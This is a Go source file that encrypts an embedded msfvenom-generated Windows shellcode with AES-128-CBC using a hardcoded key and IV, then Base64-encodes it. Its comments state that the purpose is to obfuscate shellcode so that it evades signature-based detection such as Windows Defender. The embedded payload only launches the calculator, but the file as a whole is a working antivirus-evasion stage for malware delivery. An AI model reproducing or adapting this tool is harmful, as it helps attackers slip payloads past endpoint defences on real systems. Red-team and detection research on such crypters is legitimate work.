// payload_encryption_aes.go encrypts a given shellcode payload using AES-128 CBC mode encryption
// and Base64 encoding, designed to obfuscate shellcode to evade signature-based detection mechanisms

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
)

// Any key and IV param combination for AES-128 will do,
// this step is only to avoid Win Defender from detecting msfvenom tags
var key = []byte("supersecretkey12")
var iv = []byte("16byteivstring12")

func encryptShellcode(plainText []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := aes.BlockSize
	paddedPlainText := pad(plainText, blockSize)

	mode := cipher.NewCBCEncrypter(block, iv)

	cipherText := make([]byte, len(paddedPlainText))
	mode.CryptBlocks(cipherText, paddedPlainText)

	encodedCipherText := make([]byte, base64.StdEncoding.EncodedLen(len(cipherText)))
	base64.StdEncoding.Encode(encodedCipherText, cipherText)

	return encodedCipherText, nil
}

func pad(input []byte, blockSize int) []byte {
	padLen := blockSize - (len(input) % blockSize)
	padding := bytes.Repeat([]byte{byte(padLen)}, padLen)
	return append(input, padding...)
}

func main() {
	encryptedCyphertext, err := encryptShellcode(payload)
	if err != nil {
		fmt.Printf("[-] An error occured: %s", err.Error())
	}

	fmt.Println("[+] Encrypted payload >> ", string(encryptedCyphertext))
}

// msfvenom-generated payload -> pop that calc
var payload = []byte("\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b" +
	"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2" +
	"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b" +
	"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04" +
	"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0" +
	"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2" +
	"\x48\x83\xec\x20\x41\xff\xd6")
